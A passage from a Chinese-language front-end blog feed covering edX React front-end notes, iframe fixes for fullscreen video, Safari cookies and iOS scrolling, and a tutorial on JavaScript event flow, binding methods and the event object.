<code>Enzyme</code>.</li><li>ES6</li><li>Babel</li><li>ESLint</li><li>npm</li><li>GreenKeeper</li><li>webpack</li><li>AMD(异步模块定义）</li><li>Sass</li><li>JWT</li><li>Axios</li><li>React and Redux<br>当构建新UI的时候，应当使用React。但是现在绝大部分没有使用。上次edx年会说，2019年底会完成向react转移。</li></ul><p><br><br><em>一些新React App仓库</em><br>Account页  <a href="https://github.com/edx/frontend-app-account" target="_blank" rel="noopener">https://github.com/edx/frontend-app-account</a><br>Profile页  <a href="https://github.com/edx/frontend-app-profile" target="_blank" rel="noopener">https://github.com/edx/frontend-app-profile</a></p><ul><li>环境变量通过webpack.config中process.env配置</li><li>没有发现使用了UI库</li><li>使用redux,axios,mock</li><li>卡在了<code>Access to XMLHttpRequest at ’http://localhost:18000/api/user/v1/accounts/edx&#39; from origin ‘http://localhost:1997’ has been blocked by CORS policy: Request header field use-jwt-cookie is not allowed by Access-Control-Allow-Headers in preflight response.”</code><br>slack回复需更新master分支devstack。</li><li>一些已经多个react app用到的包<br>@edx/frontend-auth  统一处理登录<br>@edx/edx-bootstrap<br>@edx/frontend-component-footer</li></ul><p><br><br><em>publisher-frontend</em><br><a href="https://github.com/edx/publisher-frontend" target="_blank" rel="noopener">https://github.com/edx/publisher-frontend</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">路由                    对应组件              功能</span><br><span class="line">/courses/new           CreateCourse         新建课程，填写org, title, price,</span><br><span class="line">/courses/:id/rerun     CreateCourseRun</span><br><span class="line">/instructors/new       CreateStaffer        新建Staff,填写name,organization_id, bio, major_works</span><br><span class="line">/instructors/:uuid     EditStaffer</span><br><span class="line">/                      CourseDashboard      列表course name, course number, owner, modified</span><br><span class="line">/courses/:id           EditCourse           编辑课程 title, description, what will you learn, primary subject,course-image, about-video-link</span><br></pre></td></tr></table></figure><p><br></p><h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><ul><li><a href="http://docs.edx.org/" target="_blank" rel="noopener">edx官方文档</a></li><li><a href="https://edx.readthedocs.io/projects/edx-installing-configuring-and-running/en/latest/configuration/changing_appearance/theming/index.html" target="_blank" rel="noopener">edx主题包官方文档</a></li><li><a href="https://github.com/edx/devstack" target="_blank" rel="noopener">安装edx H版</a></li><li><a href="https://blog.lawrencemcdaniel.com/how-to-change-the-open-edx-logo/" target="_blank" rel="noopener">How To Change the Open edX Logo</a></li><li><a href="https://open-edx-proposals.readthedocs.io/en/latest/oep-0011-bp-FED-technology.html" target="_blank" rel="noopener">OEP-11: Front End Technology Standards</a></li></ul>]]></content>
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>iframe的各种问题</title>
      <link href="/2019/04/30/iframe/"/>
      <url>/2019/04/30/iframe/</url>
      <content type="html"><![CDATA[<h3 id="1-视频无法全屏"><a href="#1-视频无法全屏" class="headerlink" title="1. 视频无法全屏"></a>1. 视频无法全屏</h3><p>使用video.js时，iframe内嵌视频无法全屏。 为iframe添加<code>allowfullscreen</code>属性即可<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"video.html"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">frameborder</span>=<span class="string">"0"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">width</span>=<span class="string">"100%"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">height</span>=<span class="string">"100%"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">scrolling</span>=<span class="string">"no"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">allowfullscreen</span>=<span class="string">"true"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">webkitallowfullscreen</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag"><span class="attr">mozallowfullscreen</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-safari浏览器中iframe嵌套的页面无法保存cookie"><a href="#2-safari浏览器中iframe嵌套的页面无法保存cookie" class="headerlink" title="2. safari浏览器中iframe嵌套的页面无法保存cookie"></a>2. safari浏览器中iframe嵌套的页面无法保存cookie</h3><p>Safari 的安全策略太严格了，iframe 嵌套的网站的 cookie 被认为是不安全的，因此不允许保存，这就导致了用户即使在 iframe 中登录了网站，也无法保持登录状态，每次跳转页面之后就需要重新登录。 </p><p>解决方法：<br>强行把 iframe 的父级页面跳转到子页面所在的网站，然后设置好 session ，再重定向到父级页面，这时候设置的 cookie 就被认为是安全的了。 </p><p><br></p><h3 id="3-iframe在IOS手机上无法滚动"><a href="#3-iframe在IOS手机上无法滚动" class="headerlink" title="3. iframe在IOS手机上无法滚动"></a>3. iframe在IOS手机上无法滚动</h3><p>解决方法：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">  <span class="selector-class">.iframe-outer</span>&#123;</span></span><br><span class="line"><span class="undefined">    position: fixed;</span></span><br><span class="line"><span class="undefined">    right: 0;</span></span><br><span class="line"><span class="undefined">    bottom: 0;</span></span><br><span class="line"><span class="undefined">    left: 0;</span></span><br><span class="line"><span class="undefined">    top: 0;</span></span><br><span class="line"><span class="undefined">    -webkit-overflow-scrolling: touch;</span></span><br><span class="line"><span class="undefined">    overflow-y: scroll;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"iframe-outer"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">    <span class="attr">style</span>=<span class="string">"width: 100%; height: 100%; border: none; "</span></span></span><br><span class="line"><span class="tag">    <span class="attr">allowfullscreen</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">webkitallowfullscreen</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">mozallowfullscreen</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">""</span></span></span><br><span class="line"><span class="tag">  &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> HTML </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>事件流与事件处理程序</title>
      <link href="/2019/04/22/%E4%BA%8B%E4%BB%B6/"/>
      <url>/2019/04/22/%E4%BA%8B%E4%BB%B6/</url>
      <content type="html"><![CDATA[<blockquote><p>js与HTML之间的交互是通过事件实现的。可以使用侦听器来预订事件，以便事件发生时执行相应的代码，这种模式被称为观察者模式。</p></blockquote><p><br></p><h3 id="1-事件流"><a href="#1-事件流" class="headerlink" title="1. 事件流"></a>1. 事件流</h3><p>事件流描述的是从页面中接收事件的顺序。IE的事件流是事件冒泡流，而Netscape Communicator的事件流失事件捕获流。<br><img src="/2019/04/22/事件/1.png" style="max-width:500px; margin-top:20px"><br><br></p><ul><li><p><em>事件捕获</em><br>由不太具体的节点更早接收到事件，而最具体的节点最后接收到事件。事件捕获的用意在于，在事件到达预定目标之前捕获它。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document -&gt; &lt;html&gt; -&gt; &lt;body&gt; -&gt; &lt;div&gt;</span><br></pre></td></tr></table></figure></li><li><p><em>事件冒泡</em><br>即事件开始时由最具体的元素（文档中嵌套层次最深的那个节点）接收，然后逐级向上传播到较为不具体的节点（文档）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;  -&gt;  &lt;body&gt;  -&gt; &lt;html&gt; -&gt; document</span><br></pre></td></tr></table></figure></li></ul><p><br><br><br></p><h3 id="2-绑定事件"><a href="#2-绑定事件" class="headerlink" title="2. 绑定事件"></a>2. 绑定事件</h3><h4 id="2-1-lt-div-onclick-quot-quot-gt"><a href="#2-1-lt-div-onclick-quot-quot-gt" class="headerlink" title="2.1 &lt;div onclick=&quot;&quot;&gt;"></a>2.1 <code>&lt;div onclick=&quot;&quot;&gt;</code></h4><p>元素支持的每种事件，都可以使用一个与相应事件处理程序同名的HTML特性来制定。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"alert('clicked!')"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- onclick有权访问全局作用域中的任何代码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"showMessage()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"try&#123;showMessage();&#125;catch(ex)&#123;&#125;"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>假设showMessage()函数是在按钮下方，页面的最底部定义的。如果用户在页面解析<code>showMessage()</code>之前就单机了按钮，就会引发错误。为此，很多HTML事件处理程序都会被装在一个try-catch块中。<br><br></p><h4 id="2-2-elem-onclick"><a href="#2-2-elem-onclick" class="headerlink" title="2.2 elem.onclick"></a>2.2 elem.onclick</h4><p>DOM0级事件绑定，使用<code>elem.onclick=function(){}</code>绑定事件，被认为是元素的方法。这时候，事件处理程序是在元素的作用域中进行。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">'myBtn'</span>);</span><br><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="keyword">this</span>.id);   <span class="comment">// 'myBtn'，this引用当前元素</span></span><br><span class="line">&#125;</span><br><span class="line">btn.onclick = <span class="literal">null</span>; <span class="comment">// 删除事件处理程序</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-3-addEventListener"><a href="#2-3-addEventListener" class="headerlink" title="2.3 addEventListener"></a>2.3 addEventListener</h4><p>DOM2级事件绑定: addEventListener() 和 removeEventListener()。接受3个参数：要处理的事件名，事件处理函数，和一个布尔值(true: 在捕获阶段调用事件， false: 在冒泡阶段调用)。为同一个元素添加两次addEventListener，两个事件会按添加顺序依次触发。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> handler = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="keyword">this</span>.id);</span><br><span class="line">&#125;</span><br><span class="line">btn.addEventListener(<span class="string">'click'</span>, handler, <span class="literal">false</span>)</span><br><span class="line">btn.removeEventListener(<span class="string">'click'</span>, handler, <span class="literal">false</span>)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-4-attachEvent"><a href="#2-4-attachEvent" class="headerlink" title="2.4 attachEvent"></a>2.4 attachEvent</h4><p>IE实现了两个类似的方法: attachEvent() 和 detachEvent()。与addEventListener不同，attachEvent，事件处理程序会在全局作用域中运行。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="keyword">this</span> === <span class="built_in">window</span>);   <span class="comment">// true</span></span><br><span class="line">&#125;</span><br><span class="line">btn.attachEvent(<span class="string">'onclick'</span>, handler);</span><br><span class="line">btn.detachEvent(<span class="string">'onclick'</span>, handler);</span><br></pre></td></tr></table></figure></p><p><br><br><br></p><h3 id="3-event对象"><a href="#3-event对象" class="headerlink" title="3. event对象"></a>3. event对象</h3><p>在触发dom上的某个事件时，会产生一个事件对象<em><code>event || window.event(IE)</code></em>，这个对象中包含着所有与事件有关的信息。包含导致事件的元素、事件的类型以及其他与特定事件相关的信息。如，鼠标操作导致的事件中，会包含鼠标位置的信息。键盘操作的事件中，会包含与按下的键有关的信息。</p><table><thead><tr><th>属性/方法</th><th style="text-align:center">值</th><th style="text-align:right">说明</th></tr></thead><tbody><tr><td>bubbles</td><td style="text-align:center">Boolean</td><td style="text-align:right">事件是否冒泡</td></tr><tr><td>cancelable</td><td style="text-align:center">Boolean</td><td style="text-align:right">是否可以取消事件的默认行为</td></tr><tr><td>currentTarget</td><td style="text-align:center">Element</td><td style="text-align:right">当前正在处理事件的那个元素</td></tr><tr><td>defaultPrevented</td><td style="text-align:center">Boolean</td><td style="text-align:right">true,表示已经调用了preventDefautl()</td></tr><tr><td>detail</td><td style="text-align:center">Interger</td><td style="text-align:right">与事件相关的细节信息</td></tr><tr><td>eventPhase</td><td style="text-align:center">Interger</td><td style="text-align:right">调用事件处理程序的阶段：1-捕获阶段，2-处于目标，3-冒泡阶段</td></tr><tr><td>preventDefault()</td><td style="text-align:center">Function</td><td style="text-align:right">取消事件的默认行为</td></tr><tr><td>stopImmediatePropagation()</td><td style="text-align:center">Function</td><td style="text-align:right">取消事件的进一步捕获或冒泡，同时阻止任何事件处理程序被调用</td></tr><tr><td>stopPropagation()</td><td style="text-align:center">Function</td><td style="text-align:right">取消事件的进一步捕获或冒泡。如果bubbles为true，则可以使用这个方法</td></tr><tr><td>target</td><td style="text-align:center">Element</td><td style="text-align:right">事件的目标</td></tr><tr><td>trusted</td><td style="text-align:center">Boolean</td><td style="text-align:right">表明事件是浏览器生成的</td></tr><tr><td>type</td><td style="text-align:center">String</td><td style="text-align:right">被触发的事件的类型</td></tr><tr><td>view</td><td style="text-align:center">AbstractView</td><td style="text-align:right">与事件关联的抽象视图。等同于发生事件的window对象   </td></tr></tbody></table><p><br></p><h4 id="3-1-currentTarget-target"><a href="#3-1-currentTarget-target" class="headerlink" title="3.1 currentTarget, target"></a>3.1 currentTarget, target</h4><p><code>currentTarget</code>始终等于对象this的值，<code>target</code>则只包含事件的实际目标。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  alert(event.currentTarget === <span class="built_in">document</span>.body);   <span class="comment">// true</span></span><br><span class="line">  alert(<span class="keyword">this</span> === <span class="built_in">document</span>.body);                  <span class="comment">// true</span></span><br><span class="line">  alert(event.target === <span class="built_in">document</span>.getElementById(<span class="string">"myBtn"</span>))  <span class="comment">// true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-2-event-type"><a href="#3-2-event-type" class="headerlink" title="3.2 event.type"></a>3.2 event.type</h4><p>在需要通过一个函数处理多个事件时，可以使用<em><code>type</code></em>属性。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> handler = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">switch</span>(event.type)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"click"</span>:</span><br><span class="line">      alert(<span class="string">"clicked"</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">"mouseover"</span>:</span><br><span class="line">      event.target.style.backgroundColor = <span class="string">"red"</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">"mouseout"</span>:</span><br><span class="line">      event.target.style.backgroundColor = <span class="string">""</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">btn.onclick = handler;</span><br><span class="line">btn.onmouseover = handler;</span><br><span class="line">btn.onmouseout = handler;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-3-event-preventDefault"><a href="#3-3-event-preventDefault" class="headerlink" title="3.3 event.preventDefault()"></a>3.3 event.preventDefault()</h4><p>阻止特定事件的默认行为，例如<code>&lt;a&gt;</code>被单击时会导航到其href特性指定的URL。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 取消了链接导航这一默认行为</span></span><br><span class="line">link.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  event.prevenDefault();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-4-stopPropagation"><a href="#3-4-stopPropagation" class="headerlink" title="3.4 stopPropagation()"></a>3.4 stopPropagation()</h4><p>立即停止事件在DOM层次中的传播，取消进一步的事件捕获或冒泡。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在按钮上调用stopPropagation()，从而避免触发注册在document.body上面的事件</span></span><br><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  alert(<span class="string">"Clicked"</span>);</span><br><span class="line">  event.stopPropagation();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.body.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  alert(<span class="string">"Body clicked"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-5-IE中的event"><a href="#3-5-IE中的event" class="headerlink" title="3.5 IE中的event"></a>3.5 IE中的event</h4><table><thead><tr><th>属性/方法</th><th style="text-align:center">值</th><th style="text-align:right">说明</th></tr></thead><tbody><tr><td>cancelBubble</td><td style="text-align:center">Boolean</td><td style="text-align:right">默认为false,设置为true可以取消事件冒泡</td></tr><tr><td>returnValue</td><td style="text-align:center">Boolean</td><td style="text-align:right">默认为true,设置为false可以取消事件的默认行为</td></tr><tr><td>srcElement</td><td style="text-align:center">Element</td><td style="text-align:right">事件的目标(与DOM的target属性相同)</td></tr><tr><td>type</td><td style="text-align:center">String</td><td style="text-align:right">事件的类型</td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// function的作用域是根据指定它的方式来确定的，不能认为this始终等于事件目标。用event.srcElement比较保险</span></span><br><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="built_in">window</span>.event.srcElement === <span class="keyword">this</span>);  <span class="comment">// true</span></span><br><span class="line">&#125;</span><br><span class="line">btn.attachEvent(<span class="string">"onclick"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  alert(event.srcElement === <span class="keyword">this</span>);  <span class="comment">// false</span></span><br><span class="line">  <span class="built_in">window</span>.event.cancelBubble = <span class="literal">true</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-6-event-clientX-pageX-screenX"><a href="#3-6-event-clientX-pageX-screenX" class="headerlink" title="3.6 event.clientX, pageX,screenX"></a>3.6 event.clientX, pageX,screenX</h4><p>得知事件发生的坐标。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// 浏览器视口中的特定位置上发生</span></span><br><span class="line">  alert(<span class="string">'Client coordinates:'</span> + event.clientX + event.clientY);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在页面中的位置,页面没有滚动的情况下,pageX和clientX相等</span></span><br><span class="line">  alert(<span class="string">'Page coordinates:'</span> + event.pageX + event.pageY);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 相对于整个电脑屏幕的位置</span></span><br><span class="line">  alert(<span class="string">'Screen coordinates:'</span> + event.screenX + event.screenY);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-7-修改键"><a href="#3-7-修改键" class="headerlink" title="3.7 修改键"></a>3.7 修改键</h4><p>在按下鼠标键盘上的某些键的状态也可以影响到所要采取的操作。这些修改键是shift, ctrl, alt和meta(windows里是windows键，苹果梨是cmd键)。DOM定义了4个属性，来表示这些修改键的状态: shiftKey, ctrlKey, altKey, metaKey(Boolean值)<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (event.shiftKey)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-跨浏览器绑定事件"><a href="#4-跨浏览器绑定事件" class="headerlink" title="4. 跨浏览器绑定事件"></a>4. 跨浏览器绑定事件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> EventUtil = &#123;</span><br><span class="line">  addHandler: <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (element.addEventListener) &#123;</span><br><span class="line">      element.addEventListener(type, handler, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.attachEvent) &#123;</span><br><span class="line">      element.attachEvent(<span class="string">"on"</span> + type, handler);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      element[<span class="string">"on"</span> + type] = handler;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  removeHandler: <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (element.removeEventListener) &#123;</span><br><span class="line">      element.removeEventListener(type, handler, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.detachEvent) &#123;</span><br><span class="line">      element.detachEvent(<span class="string">"on"</span> + type, handler);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      element[<span class="string">"on"</span> + type] = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  getEvent: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> event ? event : <span class="built_in">window</span>.event;</span><br><span class="line">  &#125;,</span><br><span class="line">  getTarget: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> event.target || event.srcElement;</span><br><span class="line">  &#125;,</span><br><span class="line">  preventDefault: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (event.preventDefault)&#123;</span><br><span class="line">      event.preventDefault();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      event.returnValue = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  stopPropagation: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (event.stopPropagation)&#123;</span><br><span class="line">      event.stopPropagation();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      event.cancelBubble = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br><br><br></p><h3 id="5-事件类型"><a href="#5-事件类型" class="headerlink" title="5. 事件类型"></a>5. 事件类型</h3><h4 id="5-1-load"><a href="#5-1-load" class="headerlink" title="5.1 load"></a>5.1 load</h4><p><code>window.load</code>当页面完全加载完后(包括所有图像，js文件，css文件等外部资源)，就会触发window上的load事件。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(<span class="built_in">window</span>, <span class="string">"load"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  alert(<span class="string">"Loaded"</span>);</span><br><span class="line">&#125;)</span><br><span class="line">&lt;body onload=<span class="string">"alert('Loaded')"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>图像上也可以触发load事件,图像加载完毕后触发事件。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(imgElem, <span class="string">"load"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  alert(<span class="string">"image loaded"</span>);</span><br><span class="line">&#125;)</span><br><span class="line">&lt;img src=<span class="string">"1.jpg"</span> onload=<span class="string">"alert('image loaded')"</span>&gt;</span><br></pre></td></tr></table></figure></p><p><code>&lt;script&gt;</code>元素也会触发load事件，以便确定动态加载的js文件是否加载完毕。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</span><br><span class="line">script.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">script.src = <span class="string">"1.js"</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(script);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-2-焦点事件"><a href="#5-2-焦点事件" class="headerlink" title="5.2 焦点事件"></a>5.2 